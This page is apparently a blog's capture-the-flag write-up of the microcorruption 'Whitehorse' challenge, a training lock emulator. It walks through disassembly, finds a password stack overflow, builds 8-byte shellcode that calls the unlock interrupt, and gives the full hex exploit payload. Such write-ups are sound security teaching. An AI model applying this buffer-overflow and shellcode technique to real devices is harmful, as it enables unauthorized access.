<!DOCTYPE html>
<html lang="en-us">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title> microcorruption - whitehorse | #!/slash/note</title>
  <meta name="description" content="[&#39;Caffeine fueled&#39;, &#39;(╯°□°)╯︵ ┻━┻&#39;, &#39;Security guy&#39;, &#39;Metalhead&#39;, &#39;I saw your password&#39;, &#39;KOOBo&#43;KXleKAv&#43;KXlSnjgaM=&#39;]">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="all,follow">
  <meta name="googlebot" content="index,follow,snippet,archive">
  <meta property="og:title" content="microcorruption - whitehorse" />
<meta property="og:description" content="
     


This post is part of the series of solving microcorruption.com ctf challenges which continues from the previous challenge called Reykjavik. This challenge is titled Whitehorse.
This challenge has the following description towards the bottom:

This is Software Revision 01. The firmware has been updated to connect with the new hardware security module. We have removed the function to unlock the door from the LockIT Pro firmware.

Not a lot of information to go on. Lets dig into the code to learn more." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://leonjza.github.io/blog/2018/03/07/microcorruption-whitehorse/" />
<meta property="article:published_time" content="2018-03-07T16:11:34+02:00" />
<meta property="article:modified_time" content="2018-03-07T16:11:34+02:00" />

  <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="microcorruption - whitehorse"/>
<meta name="twitter:description" content="
     


This post is part of the series of solving microcorruption.com ctf challenges which continues from the previous challenge called Reykjavik. This challenge is titled Whitehorse.
This challenge has the following description towards the bottom:

This is Software Revision 01. The firmware has been updated to connect with the new hardware security module. We have removed the function to unlock the door from the LockIT Pro firmware.

Not a lot of information to go on. Lets dig into the code to learn more."/>

  
  
  
  <link rel="stylesheet" href="https://leonjza.github.io/css/style-white.css">
  
  
  
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  

  
<link rel="icon" type="image/png" href="https://leonjza.github.io/images/favicon.png" />

  
  
  
  
  
    
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-44457032-2', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>

  
  
</head>

<body class="max-width mx-auto px3 ltr">
  <div class="content index py4">

    <header id="header">
  <a href="https://leonjza.github.io">
  
    <div id="logo" style="background-image: url(https://leonjza.github.io/images/logo.png)"></div>
  
  <div id="title">
    <h1>#!/slash/note</h1>
  </div>
  </a>
  <div id="nav">
    <ul>
      <li class="icon">
        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
      </li>
      
        <li><a href="https://leonjza.github.io/">Home</a></li>
      
        <li><a href="https://leonjza.github.io/about/">About Me</a></li>
      
    </ul>
  </div>
</header>



    
<article class="post" itemscope itemtype="http://schema.org/BlogPosting">

  <div class="content" itemprop="articleBody">
  
    <figure>
    <img src="https://leonjza.github.io/images/microcorruption/microcorruption.png"/> 
</figure>

<p>This post is part of the series of solving <a href="https://microcorruption.com">microcorruption.com</a> ctf challenges which continues from the <a href="https://leonjza.github.io/blog/2018/03/06/microcorruption---reykjavik/">previous challenge</a> called <em>Reykjavik</em>. This challenge is titled <em>Whitehorse</em>.</p>
<p>This challenge has the following description towards the bottom:</p>
<blockquote>
<p>This is Software Revision 01. The firmware has been updated to connect with the new hardware security module. We have removed the function to unlock the door from the LockIT Pro firmware.</p>
</blockquote>
<p>Not a lot of information to go on. Lets dig into the code to learn more.</p>
<h2 id="whitehorse">whitehorse</h2>
<p>For whitehorse, the <code>main</code> routine had a familiar setup where it simply called <code>login</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm">4438 &lt;<span style="color:#50fa7b">main</span>&gt;
4438:  <span style="color:#50fa7b">b012</span> f444      call  <span style="color:#6272a4">#0x44f4 &lt;login&gt;
</span></code></pre></div><p>The <code>login</code> routine in turn did not have any particularly interesting logic in it either other than a call to <code>conditional_unlock_door</code> at <code>0x4514</code>. This routine seems to just get a password via a syscall, run <code>conditional_unlock_door</code> and print a message of <em>&ldquo;Access granted.&quot;</em> or <em>&ldquo;That password is not correct.&quot;</em> depending on the result of the <code>tst r15</code> call.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm">44<span style="color:#50fa7b">f4</span> &lt;login&gt;
44<span style="color:#8be9fd;font-style:italic">f4:</span>  3150 <span style="color:#50fa7b">f0ff</span>      add   <span style="color:#6272a4">#0xfff0, sp
</span><span style="color:#6272a4"></span><span style="color:#bd93f9">44</span>f8:  <span style="color:#bd93f9">3</span>f40 <span style="color:#bd93f9">7044</span>      mov   <span style="color:#6272a4">#0x4470 &#34;Enter the password to continue.&#34;, r15
</span><span style="color:#6272a4"></span><span style="color:#bd93f9">44</span>fc:  b012 <span style="color:#bd93f9">9645</span>      call  <span style="color:#6272a4">#0x4596 &lt;puts&gt;
</span><span style="color:#6272a4"></span><span style="color:#bd93f9">4500</span>:  <span style="color:#bd93f9">3</span>f40 <span style="color:#bd93f9">9044</span>      mov   <span style="color:#6272a4">#0x4490 &#34;Remember: passwords are between 8 and 16 characters.&#34;, r15
</span><span style="color:#6272a4"></span><span style="color:#bd93f9">4504</span>:  b012 <span style="color:#bd93f9">9645</span>      call  <span style="color:#6272a4">#0x4596 &lt;puts&gt;
</span><span style="color:#6272a4"></span><span style="color:#bd93f9">4508</span>:  <span style="color:#bd93f9">3</span>e40 <span style="color:#bd93f9">3000</span>      mov   <span style="color:#6272a4">#0x30, r14
</span><span style="color:#6272a4"></span><span style="color:#bd93f9">450</span>c:  <span style="color:#bd93f9">0</span>f41           mov   sp, r15
450<span style="color:#8be9fd;font-style:italic">e:</span>  <span style="color:#50fa7b">b012</span> <span style="color:#bd93f9">8645</span>      call  <span style="color:#6272a4">#0x4586 &lt;getsn&gt;
</span><span style="color:#6272a4"></span><span style="color:#bd93f9">4512</span>:  <span style="color:#bd93f9">0</span>f41           mov   sp, r15
4514:  <span style="color:#50fa7b">b012</span> <span style="color:#bd93f9">4644</span>      call  <span style="color:#6272a4">#0x4446 &lt;conditional_unlock_door&gt;
</span><span style="color:#6272a4"></span><span style="color:#bd93f9">4518</span>:  <span style="color:#bd93f9">0</span>f93           tst   r15

<span style="color:#6272a4">; notice that there does not seem to be any logic to unlock here?
</span><span style="color:#6272a4"></span>451<span style="color:#8be9fd;font-style:italic">a:</span>  0324           <span style="color:#50fa7b">jz</span>    <span style="color:#6272a4">#0x4522 &lt;login+0x2e&gt;
</span><span style="color:#6272a4"></span><span style="color:#bd93f9">451</span>c:  <span style="color:#bd93f9">3</span>f40 c544      mov   <span style="color:#6272a4">#0x44c5 &#34;Access granted.&#34;, r15
</span><span style="color:#6272a4"></span><span style="color:#bd93f9">4520</span>:  <span style="color:#bd93f9">023</span>c           jmp   <span style="color:#6272a4">#0x4526 &lt;login+0x32&gt;
</span><span style="color:#6272a4"></span><span style="color:#bd93f9">4522</span>:  <span style="color:#bd93f9">3</span>f40 d544      mov   <span style="color:#6272a4">#0x44d5 &#34;That password is not correct.&#34;, r15
</span><span style="color:#6272a4"></span><span style="color:#bd93f9">4526</span>:  b012 <span style="color:#bd93f9">9645</span>      call  <span style="color:#6272a4">#0x4596 &lt;puts&gt;
</span><span style="color:#6272a4"></span><span style="color:#bd93f9">452</span>a:  <span style="color:#bd93f9">3150</span> <span style="color:#bd93f9">1000</span>      add   <span style="color:#6272a4">#0x10, sp
</span><span style="color:#6272a4"></span><span style="color:#bd93f9">452</span>e:  <span style="color:#bd93f9">3041</span>           ret
</code></pre></div><p>Weird, no syscall to unlock the lock? Lets see what <code>conditional_unlock_door</code> does:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm">4446 &lt;<span style="color:#50fa7b">conditional_unlock_door</span>&gt;
4446:  0412           <span style="color:#50fa7b">push</span>  r4
4448:  0441           <span style="color:#50fa7b">mov</span>   sp, r4
444<span style="color:#8be9fd;font-style:italic">a:</span>  2453           <span style="color:#50fa7b">incd</span>  r4
444<span style="color:#8be9fd;font-style:italic">c:</span>  2183           <span style="color:#50fa7b">decd</span>  sp
444<span style="color:#8be9fd;font-style:italic">e:</span>  <span style="color:#50fa7b">c443</span> fcff      mov.b <span style="color:#6272a4">#0x0, -0x4(r4)
</span><span style="color:#6272a4"></span><span style="color:#bd93f9">4452</span>:  <span style="color:#bd93f9">3</span>e40 fcff      mov   <span style="color:#6272a4">#0xfffc, r14
</span><span style="color:#6272a4"></span><span style="color:#bd93f9">4456</span>:  <span style="color:#bd93f9">0</span>e54           add   r4, r14
4458:  0<span style="color:#50fa7b">e12</span>           push  r14
445<span style="color:#8be9fd;font-style:italic">a:</span>  0<span style="color:#50fa7b">f12</span>           push  r15
445<span style="color:#8be9fd;font-style:italic">c:</span>  3012 7<span style="color:#50fa7b">e00</span>      push  <span style="color:#6272a4">#0x7e
</span><span style="color:#6272a4"></span><span style="color:#bd93f9">4460</span>:  b012 <span style="color:#bd93f9">3245</span>      call  <span style="color:#6272a4">#0x4532 &lt;INT&gt;
</span><span style="color:#6272a4"></span><span style="color:#bd93f9">4464</span>:  <span style="color:#bd93f9">5</span>f44 fcff      mov.b -<span style="color:#bd93f9">0x4</span>(r4), r15
4468:  8<span style="color:#50fa7b">f11</span>           sxt   r15
446<span style="color:#8be9fd;font-style:italic">a:</span>  3152           <span style="color:#50fa7b">add</span>   <span style="color:#6272a4">#0x8, sp
</span><span style="color:#6272a4"></span><span style="color:#bd93f9">446</span>c:  <span style="color:#bd93f9">3441</span>           pop   r4
446<span style="color:#8be9fd;font-style:italic">e:</span>  3041           <span style="color:#50fa7b">ret</span>
</code></pre></div><p>Errr, also pretty boring. This routine eventually does syscall <code>0x7e</code> though. In the <a href="https://microcorruption.com/manual.pdf">lock&rsquo;s manual</a>, <code>0x7e</code> is described as:</p>
<blockquote>
<p>Interface with the HSM-2. Trigger the deadbolt unlock if the password is correct.</p>
</blockquote>
<p>So it seems like this syscall might be the only logic we have to unlock the lock. Problem is though, the &ldquo;HSM&rdquo; is confirming the password validation here.</p>
<p>Digging a bit further, I decided to enter a password that was again larger than the suggested <em>&ldquo;8 to 16 characters&rdquo;</em>.</p>
<figure>
    <img src="https://leonjza.github.io/images/microcorruption/whitehorse_stack_overflow.png"/> 
</figure>

<p>Well looksy there! A stack overflow from the password field as the stack pointer (<code>sp</code>) points to <code>0x36ca</code> when the login function wants to return, meaning we can redirect the flow of code execution as we wish! There is just one problem here. We don&rsquo;t have any useful code we can jump to. The instruction at <code>0x445c</code> uses sycall <code>0x7e</code>, which asks the HSM to confirm the password.</p>
<p>So what can we do? Well, we control a number of bytes in the password buffer, what if we jump to our own opcodes (shellcode)? :)</p>
<p>To write the correct instructions needed to open the lock, we need to have read the <a href="https://microcorruption.com/manual.pdf">locks manual</a> and know that doing a syscall with interrupt number <code>0x7f</code> will open the lock (without some fancy pants HSM trying to verify anything). If you were paying attention in the previous challenges you may have also noticed that <code>0xf7</code> was used to unlock the lock there.</p>
<p>From the locks manual and some of the challenges we have done up until now, we know that we need to simply push the interrupt number onto the stack that we want to call. This challenge already contains the opcodes we need for that too in the <code>conditional_unlock_door</code> routine, so its really easy to just copy/paste and modify those to suit our needs.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm">445<span style="color:#8be9fd;font-style:italic">c:</span>  3012 7<span style="color:#50fa7b">e00</span>      push  <span style="color:#6272a4">#0x7e
</span><span style="color:#6272a4"></span><span style="color:#bd93f9">4460</span>:  b012 <span style="color:#bd93f9">3245</span>      call  <span style="color:#6272a4">#0x4532 &lt;INT&gt;
</span></code></pre></div><p>For reference, you can use the <a href="https://onlinedisassembler.com/odaweb/">online disassembler</a> again, pasting the 8 raw bytes and reading the disassembly as you modify them to make sure you are on the right track. In reality, all we want to do really is swap the <code>0x7e</code> for an <code>0x7f</code>.</p>
<figure>
    <img src="https://leonjza.github.io/images/microcorruption/whitehorse_shellcode.png"/> 
</figure>

<p>Our final opcodes for our custom shellcode would be:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm">3012 7<span style="color:#50fa7b">f00</span>
<span style="color:#50fa7b">b012</span> <span style="color:#bd93f9">3245</span>
</code></pre></div><p>Easy! That means the shellcode to unlock the lock will be <code>30127f00b0123245</code> within the password we provide. The size of our shellcode is exactly 8 bytes, meaning it fits comfortably within the password buffer, right before we corrupt the stack. That solves the shellcode we want to use, but how do we <strong>get</strong> there? That is actually really easy. :)</p>
<figure>
    <img src="https://leonjza.github.io/images/microcorruption/whitehorse_password_buffer_start.png"/> 
</figure>

<p>While debugging the program, you will see that the password buffer always starts at <code>0x36ba</code>. We can also see that bytes 17 and 18 corrupt the stack causing that <code>ret</code> instruction to jump to an address we control, so all we should be doing is pad the password input with enough bytes so that position 17 and 18 can slide in <code>0x36ba</code> as the final 2 bytes of our payload.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">$ python
<span style="color:#ff79c6">&gt;&gt;&gt;</span> shellcode <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;30127f00b0123245&#34;</span>
<span style="color:#ff79c6">&gt;&gt;&gt;</span> pad_char <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;41&#34;</span>
<span style="color:#ff79c6">&gt;&gt;&gt;</span> ret <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;ba36&#34;</span>
<span style="color:#ff79c6">&gt;&gt;&gt;</span>
<span style="color:#ff79c6">&gt;&gt;&gt;</span> <span style="color:#ff79c6">print</span>(shellcode <span style="color:#ff79c6">+</span> (pad_char <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">8</span>) <span style="color:#ff79c6">+</span> ret)
<span style="color:#bd93f9">30127</span>f00b01232454141414141414141ba36
</code></pre></div><figure>
    <img src="https://leonjza.github.io/images/microcorruption/whitehorse_unlock_win.png"/> 
</figure>

<p>With our final payload which includes custom shellcode to unlock the lock, we can see the <code>ret</code> causes a <code>jmp</code> to <code>0x36ba</code>, where syscall <code>0x7f</code> is prepared and called.</p>
<h2 id="solution">solution</h2>
<p>Enter <code>30127f00b01232454141414141414141ba36</code> as hex encoded input.</p>
<h2 id="other-challenges">other challenges</h2>
<p>For my other write ups in the microcorruption series, checkout <a href="https://leonjza.github.io/categories/microcorruption/">this</a> link.</p>
  
  </div>
</article>


    <footer id="footer">
  <div class="footer-left">
    Copyright  &copy; 2020  Leon Jacobs 
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
        <li><a href="https://leonjza.github.io/">Home</a></li>
         
        <li><a href="https://leonjza.github.io/about/">About Me</a></li>
        
      </ul>
    </nav>
  </div>
</footer>


  </div>
</body>

<link rel="stylesheet" href=https://leonjza.github.io/lib/font-awesome/css/all.min.css>
<script src=https://leonjza.github.io/lib/jquery/jquery.min.js></script>
<script src=https://leonjza.github.io/js/main.js></script>
</html>
